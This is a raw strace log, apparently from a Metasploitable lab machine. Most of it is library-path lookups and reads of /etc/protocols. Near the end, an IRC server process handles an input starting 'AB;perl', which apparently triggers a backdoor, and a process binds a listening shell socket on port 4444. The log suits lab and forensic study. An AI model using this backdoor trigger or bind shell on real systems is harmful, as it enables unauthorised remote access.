8424  07:23:22.891929 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.891940 stat64("/lib/sse2", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.891951 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.891963 stat64("/lib/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.891974 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.891986 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8424  07:23:22.892002 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892016 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892028 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892040 stat64("/usr/lib/tls/i686/sse2", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892052 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892064 stat64("/usr/lib/tls/i686/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892076 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892088 stat64("/usr/lib/tls/i686", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892099 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892112 stat64("/usr/lib/tls/sse2/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892123 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892145 stat64("/usr/lib/tls/sse2", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892187 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892216 stat64("/usr/lib/tls/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892242 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892254 stat64("/usr/lib/tls", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892265 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892278 stat64("/usr/lib/i686/sse2/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892290 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892302 stat64("/usr/lib/i686/sse2", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892313 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892326 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8424  07:23:22.892344 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892356 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8424  07:23:22.892373 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892385 stat64("/usr/lib/sse2/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892397 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892409 stat64("/usr/lib/sse2", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892420 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892432 stat64("/usr/lib/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892443 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892459 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
8424  07:23:22.892476 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892490 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892502 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892516 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892528 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892541 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892553 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892566 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892578 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892592 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892604 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892617 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892709 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892725 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892737 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892750 stat64("/lib/i486-linux-gnu/tls", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892761 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892775 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892787 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892801 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892813 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892826 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892838 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892850 stat64("/lib/i486-linux-gnu/i686", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892862 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892875 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892887 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892900 stat64("/lib/i486-linux-gnu/sse2", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892911 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892924 stat64("/lib/i486-linux-gnu/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892936 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892949 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8424  07:23:22.892966 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.892983 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.892996 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.893010 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.893023 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.893036 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.893049 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.893062 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.893074 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.893088 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.893100 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.893113 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.893126 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.893139 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.893151 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.893164 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.893176 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.893189 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.893209 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.893224 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.893237 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.893250 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.893263 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.893275 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.893288 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.893301 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.893313 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.893326 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.893338 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.893351 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfc5a8ec) = -1 ENOENT (No such file or directory)
8424  07:23:22.893363 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8424  07:23:22.893376 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8424  07:23:22.893395 munmap(0xb7d9d000, 29913) = 0
8424  07:23:22.893417 open("/etc/ld.so.cache", O_RDONLY) = 6
8424  07:23:22.893429 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8424  07:23:22.893446 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d9d000
8424  07:23:22.893457 close(6)          = 0
8424  07:23:22.893470 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8424  07:23:22.893485 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
8424  07:23:22.893500 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
8424  07:23:22.893592 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
8424  07:23:22.893614 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7d92000
8424  07:23:22.893626 mmap2(0xb7d9b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7d9b000
8424  07:23:22.893643 close(6)          = 0
8424  07:23:22.893667 munmap(0xb7d9d000, 29913) = 0
8424  07:23:22.893684 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
8424  07:23:22.893709 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
8424  07:23:22.893756 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
8424  07:23:22.893774 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7da4000
8424  07:23:22.893800 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
8424  07:23:22.894038 close(6)          = 0
8424  07:23:22.894049 munmap(0xb7da4000, 4096) = 0
8424  07:23:22.894068 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
8424  07:23:22.894082 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
8424  07:23:22.894099 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7da4000
8424  07:23:22.894109 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
8424  07:23:22.894341 close(6)          = 0
8424  07:23:22.894352 munmap(0xb7da4000, 4096) = 0
8424  07:23:22.894381 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
8424  07:23:22.894407 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5adf8) = -1 EINVAL (Invalid argument)
8424  07:23:22.894421 _llseek(6, 0, 0xbfc5ae40, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8424  07:23:22.894434 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5adf8) = -1 EINVAL (Invalid argument)
8424  07:23:22.894444 _llseek(6, 0, 0xbfc5ae40, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8424  07:23:22.894454 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
8424  07:23:22.894511 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
8424  07:23:22.894548 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
8424  07:23:22.894573 listen(6, 5)      = 0
8424  07:23:22.894630 accept(6,  <unfinished ...>
8423  07:23:22.930984 exit_group(0)     = ?
8421  07:23:22.931074 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 8423
8421  07:23:22.931091 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8421  07:23:22.931104 --- SIGCHLD (Child exited) @ 0 (0) ---
8421  07:23:22.931113 waitpid(-1, 0xbfc9a018, WNOHANG) = -1 ECHILD (No child processes)
8421  07:23:22.931125 sigreturn()       = ? (mask now [])
8421  07:23:22.931154 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
8421  07:23:22.931245 exit_group(0)     = ?
4519  07:23:22.931285 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 8421
4519  07:23:22.931313 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:23:22.931327 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:23:22.931338 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:23:22.931348 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:23:22.931368 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:23:22.931433 gettimeofday({1495625002, 931438}, NULL) = 0
4519  07:23:22.931467 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 860000})
4519  07:23:23.071569 clock_gettime(CLOCK_MONOTONIC, {1812, 888599304}) = 0
4519  07:23:23.071620 recv(4, "PRIVMSG  #testit BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 58
4519  07:23:23.071664 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071695 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071710 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071724 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071738 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071752 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071766 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071780 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071793 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071807 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071820 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071834 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071847 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071861 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071875 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071888 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071902 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071915 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071929 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.071985 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.072025 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.072058 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:23.072092 time(NULL)        = 1495625003
